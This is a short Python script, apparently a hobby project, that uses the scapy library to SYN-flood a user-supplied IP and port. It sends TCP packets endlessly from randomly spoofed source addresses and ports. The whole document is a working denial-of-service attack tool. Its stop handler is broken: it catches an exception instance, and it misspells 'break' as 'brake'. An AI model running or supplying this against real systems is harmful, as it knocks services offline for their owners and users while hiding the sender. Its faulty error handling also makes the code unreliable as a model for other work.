#!/usr/bin/python3

# Simple SYN flooder made using 'scapy' module.
# This project was created only for learning and will not be developed any more.
# Author: D1N3SHh


from scapy.all import *
from random import randint


def flood(target_host, target_port):
    while True:
        try:
            source_ip = ".".join(str(randint(0,255)) for _ in range(4))
            source_port = randint(49152,65535)

            ip_header = IP(src=source_ip, dst=target_host)
            tcp_header = TCP(sport=source_port, dport=target_port)

            syn_packet = (ip_header/tcp_header)
            send(syn_packet, verbose=False)
        except KeyboardInterrupt():
            print("[*] Flooding stoped...")
            brake


def main():
    target_host = str(input("[$] Target ip: "))
    target_port = int(input("[$] Target port: "))

    print("[*] Starting flooding...")
    flood(target_host, target_port)


if __name__ == "__main__":
    main()